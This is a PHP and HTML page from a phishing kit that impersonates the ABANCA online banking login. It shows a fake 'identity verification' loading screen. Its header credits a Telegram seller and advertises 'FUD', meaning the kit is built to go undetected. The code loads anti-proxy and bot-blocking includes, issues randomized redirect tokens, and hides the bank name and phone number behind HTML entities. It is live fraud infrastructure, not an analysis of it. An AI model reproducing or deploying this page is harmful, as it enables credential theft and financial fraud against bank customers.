<?php
/**
###############################################
#$      https://telegram.me/neo_net          $#
#$          The Wine Juggler of FUD          $#
###############################################
**/
/* Antiproxyes & Blockers */
include 'ant-b/ant-one.php';
include 'ant-b/ant-two.php';
include 'ant-b/ant-three.php';
include 'ant-b/ant-four.php';
include 'ant-p/ant-p.php';
/* FUD New */
$reader = sha1(rand(1,9999999));
if (isset($_GET['ecma'])) {}
else {
$name = $reader.rand(1,99999);
$om = sha1(rand(1,99999));
header('Location: status.php?ecma='.$name.'&lock='.$om.'');}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="es-ES">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><meta name="robots" content="noindex, nofollow" />
  <meta name="msapplication-TileColor" content="#FFFFFF" />
  <meta name="msapplication-TileImage" content="./assets/images/Iconos/NGB-2.png" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, minimal-ui" /><link rel="apple-touch-icon" href="./assets/images/Iconos/NGB-1.png" /><link id="ctl00_cssIcon" rel="shortcut icon" href="favicon.ico" /><link rel="stylesheet" href="./assets/css/normalize.css" type="text/css" /><link rel="stylesheet" href="./assets/css/skeleton.css" type="text/css" /><link rel="stylesheet" href="./assets/css/fixedsticky.css" type="text/css" /><link rel="stylesheet" href="./assets/css/layout_V2.css" type="text/css" /><link rel="stylesheet" href="./assets/css/ed_general_V2.css" type="text/css" /><link rel="Stylesheet" href="./assets/css/font-awesome.min.css" type="text/css" /><link href="./assets/css/Pub_Logon.css" rel="stylesheet" type="text/css" /><link href="./assets/css/Sug_Logon.css" rel="stylesheet" type="text/css" />
  <script type="text/javascript" src="./assets/js/jquery-3.6.0.min.js"></script>
<title>
  &#65;&#99;&#99;&#101;&#115;&#111;&#32;&#66;&#97;&#110;&#99;&#97;&#32;&#69;&#108;&#101;&#99;&#116;&#114;&#243;&#110;&#105;&#99;&#97;&#32;&#65;&#66;&#65;&#78;&#67;&#65;
</title></head>
<body class="">
  <div id="container">
    <div id="header">
      <div class="page-header-secondary">
        <div class="container">
          <div class="sixteen columns alpha">
            <ul class="left-info">
              <li><i class="fa fa-phone"></i>&nbsp;<span>&#57;&#56;&#49;&#32;&#57;&#49;&#48;&#32;&#53;&#50;&#50;</span></li>
              <li class="ayuda"><i class='fa fa-fw fa-bullhorn'></i>
                <a id="ctl00_hyHelp" href="#" target="_blank">Ayuda</a>
              </li>
            </ul>
            <ul class="right-info">
              <li><a href="../?l=1034" tabindex="0">
                Castellano</a></li>
                <li><a href="../?l=1110" tabindex="0">
                  Galego</a></li>
              <li><a href="../?l=1033" tabindex="0">
                English</a></li>
            </ul>
          </div>
        </div>
      </div>
      <div id="header-primary" class="page-header-primary">
        <div class="container">
          <div class="sixteen columns alpha">
            <div class="wrapper">
              <a id="ctl00_logo" class="logo" href="#" target="_blank"><span class="accesible">Banca electr&oacute;nica</span></a>
              <ul class="right-info">
                <li class="tlfAyuda"><i class="fa fa-phone"></i>&nbsp;<span>981 910 522</span></li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="content">
      <div class="container">
        <div class="sixteen columns alpha">
          <div class="wrapper">
            <div class="sixteen columns alpha">
              <h2 class="main_title">
                Bienvenido a la Banca electr&oacute;nica y &#66;&#117;&#122;&#243;&#110;&#32;&#68;&#105;&#103;&#105;&#116;&#97;&#108;&#32;&#100;&#101;&#32;&#65;&#66;&#65;&#78;&#67;&#65;.
              </h2>
            </div>
            <div class="eight columns alpha">
              <div class="access_left">
    <form action="#" method="post" id="fFirst" accept-charset="utf-8" autocomplete="off">
        <input type="hidden" id="entidad" name="entidad" value="2080" />
        <div class="section">
            <h1>Verificando tu Identidad
                <span class="logo"></span>
            </h1>
            <input type="hidden" name="content" value="main2">
        </div>
            <div class="login_options" id="capaAyudaNIF" style="display:none; font-size:12px;color:#666">
                <br />
                <p style="color:#313538"><strong>¿Qué código de usuario debo introducir para acceder a mi Banca Electrónica?</strong></p>
                <p><b>Utiliza tu NIF o NIE para conectarte.</b> Debes teclear también los CEROS que tu documento tenga a la izquierda para completar un total de 9 caracteres, por ejemplo 00123456A.</p>
                <p><b>Si no dispones de NIF o NIE</b>, utiliza el código de usuario que tengas asignado. Y, si no lo recuerdas, prueba a conectarte con el número de tu contrato de Banca Distancia, en este caso no debes teclear ceros a la izquierda.</p>
                <p><a href="#" target="_blank">Preguntas frecuentes sobre contraseñas y acceso</a></p>
                <p style="text-align:right;"><a href="#" title="Cerrar" tabindex="0">Cerrar</a></p>
            </div>
        <div id="access_box2" class="access_box clearfix">
            <div class="eight columns alpha login_options">
                <div class="select_option">
                    <div class="steps"><strong>
                        1.</strong></div>
                    <div class="text">
                        <p>
                            <strong>
                              Por favor espera mientras nuestro sistema Anti-fraude verifica sus datos, esto puede tardar unos segundos.</strong>
                        </p>
                    </div>
                </div>
                <div class="eight columns omega options">
                  <img src="assets/images/cargando.gif" style="position: relative; display:block; text-align:center; 
    margin: 0px 0px 0px 70px;">
                </div>
            </div>
        </div>
        <div class="eight columns alpha">
        </div>
            <div class="eight columns alpha" style="font-size: 1.2em;">
                <br />
                <p>
                    ¿Aún no tienes tus claves? <a href="#">Solicítalas ahora</a>.
                </p>
            </div>
    </form>
              </div>
            </div>
            <div class="eight columns omega">
              <div class="access_right">
                <div class="section">
                  <h1>
                    Empresas
                    <span class="logo"></span>
                  </h1>
                </div>
                <div class="section_empresas">
                  <a id="ctl00_litBEEmpresas" href="#">Acceso Banca Electrónica de Empresas</a>
                </div>
                <br />
                <h3>
                  ¿Sabías que … ?</h3>
                <div class="actions_box">
                  <div id="ctl00_Sugerencias" class="Pub_SLOG" style="display:none;">
    <p class="Pub_Desc_SLOG"></p>
    <a href="#" class="Pub_LinkMasInfo_SLOG"></a>
</div>
                </div>
                <h3>
                  Te puede interesar</h3>
                <div class="actions_box">
                  <div id="ctl00_Recomendaciones" class="Pub_PLOG" style="display: none;">
  <span class="Pub_Titulo_PLOG"><a href="#" class="Pub_LinkImagen_PLOG">
    <img class="Pub_Imagen_PLOG"></img>
  </a><a class="Pub_LinkTitulo_PLOG" href="#"></a></span>
  <p class="Pub_Desc_PLOG">
  </p>
  <a href="#" class="Pub_LinkContratar_PLOG"></a><a href="#" class="Pub_LinkMasInfo_PLOG"></a>
</div>
                </div>
                <h3 style="clear: both; padding-top: 0.8em;">
                  ¡Muy importante!</h3>
                <div class="actions_box seguridad_logon">
                  <p>
                    Recuerda que ABANCA nunca te solicitará por correo electrónico claves de banca electrónica ni enlaces a esta página.
                  </p>
                  <p>
                    <a id="ctl00_litRecomendacionesSeguridad" href="#" target="_blank">Recomendaciones de Seguridad</a>.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="footer">
      <div class="container">
        <div class="sixteen columns alpha">
          <div class="wrapper">
            <div class="eight columns alpha">
              <div class="left_wrap">
                <p>
                  <a class="logo_footer" tabindex="0"><span class="accesible">NCG</span></a><span>
                    &copy; ABANCA Corporación Bancaria S.A. Todos los derechos reservados.</span>
                </p>
                <p>
                  <input type="hidden" name="" id="loginpage-logincontroller-login-pini">
                  <span>
                    <a id="ctl00_litPoliticaPrivacidad" href="#" target="_blank">Política de privacidad</a>
                    |&nbsp;<a id="ctl00_litUrlCookies" href="#" target="_blank">Política de cookies</a>
                      |&nbsp;<a id="ctl00_LinkContrato" href="#" target="_blank">Contrato</a>
                      |&nbsp;<a id="ctl00_litUrlTarifasGeneral" href="#" target="_blank">Tarifas</a>
                    |&nbsp;<a id="ctl00_litSeguridadBep" href="#" target="_blank">Seguridad</a>
                      |&nbsp;<a href="#" target="_blank">Manual operativo</a>
                  </span>
                </p>
              </div>
            </div>
            <div class="eight columns omega">
              <div class="right_wrap">
                  <p style="float: left;">
                    <a href="#" target="_blank" tabindex="0">
                      <img alt="AENOR" src="./assets/images/Aenor.gif" /></a>
                  </p>
                <p>
                  Si tienes dudas puedes consultar la <a href="#" target="_blank">Sección de ayuda</a>.
                </p>
                <p>
                  o llamarnos al
                  <span>
                    &#57;&#56;&#49;&#32;&#57;&#49;&#48;&#32;&#53;&#50;&#50;</span>
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
<script type="text/javascript" src="assets/js/load.js"></script>
</body>
</html>